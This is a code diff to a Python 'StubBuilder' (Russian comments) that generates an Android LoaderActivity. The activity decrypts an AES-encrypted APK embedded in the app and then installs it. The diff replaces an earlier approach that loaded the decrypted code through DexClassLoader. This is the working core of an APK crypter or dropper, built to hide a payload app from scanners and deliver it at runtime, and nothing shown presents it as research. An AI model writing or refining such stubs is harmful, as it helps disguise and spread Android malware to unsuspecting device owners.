@@ -243,18 +243,16 @@ class StubBuilder:
         return signed_apk
     
     def generate_loader_activity(self, aes_key_hex: str, original_package: str) -> str:
-        """Генерирует код LoaderActivity который запускает оригинальное приложение"""
+        """Генерирует код LoaderActivity который устанавливает расшифрованный APK"""
         return f'''package com.loader;
 
 import android.app.Activity;
-import android.content.Context;
 import android.content.Intent;
+import android.net.Uri;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import java.io.*;
-import java.lang.reflect.Method;
-import dalvik.system.DexClassLoader;
 import javax.crypto.Cipher;
 import javax.crypto.spec.GCMParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
@@ -262,7 +260,6 @@ import javax.crypto.spec.SecretKeySpec;
 public class LoaderActivity extends Activity {{
     
     private static final byte[] AES_KEY = hexToBytes("{aes_key_hex}");
-    private static final String ORIGINAL_PACKAGE = "{original_package}";
     
     @Override
     protected void onCreate(Bundle savedInstanceState) {{
@@ -284,37 +281,19 @@ public class LoaderActivity extends Activity {{
                     is.close();
                     
                     // Расшифровываем APK
-                    byte[] decryptedApk = decryptAES(encryptedApk);
+                    final byte[] decryptedApk = decryptAES(encryptedApk);
                     
-                    // Сохраняем расшифрованный APK
-                    File apkFile = new File(getFilesDir(), "decrypted.apk");
+                    // Сохраняем расшифрованный APK в cache
+                    final File apkFile = new File(getCacheDir(), "app.apk");
                     FileOutputStream fos = new FileOutputStream(apkFile);
                     fos.write(decryptedApk);
                     fos.close();
                     
-                    // Загружаем DEX из расшифрованного APK
-                    File dexOutputDir = getDir("dex", Context.MODE_PRIVATE);
-                    DexClassLoader classLoader = new DexClassLoader(
-                        apkFile.getAbsolutePath(),
-                        dexOutputDir.getAbsolutePath(),
-                        null,
-                        getClassLoader()
-                    );
-                    
-                    // Запускаем главную Activity оригинального приложения
+                    // Устанавливаем APK
                     new Handler(Looper.getMainLooper()).post(new Runnable() {{
                         @Override
                         public void run() {{
-                            try {{
-                                // Пытаемся запустить оригинальное приложение
-                                Intent launchIntent = getPackageManager().getLaunchIntentForPackage(ORIGINAL_PACKAGE);
-                                if (launchIntent != null) {{
-                                    startActivity(launchIntent);
-                                }}
-                            }} catch (Exception e) {{
-                                e.printStackTrace();
-                            }}
-                            finish();
+                            installApk(apkFile);
                         }}
                     }});
                     
@@ -350,6 +329,14 @@ public class LoaderActivity extends Activity {{
         System.arraycopy(tag, 0, input, ciphertext.length, 16);
         
         return cipher.doFinal(input);
+    }}
+    
+    private void installApk(File apkFile) {{
+        Intent intent = new Intent(Intent.ACTION_VIEW);
+        intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
+        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(intent);
+        finish();
     }}
     
     private static byte[] hexToBytes(String hex) {{
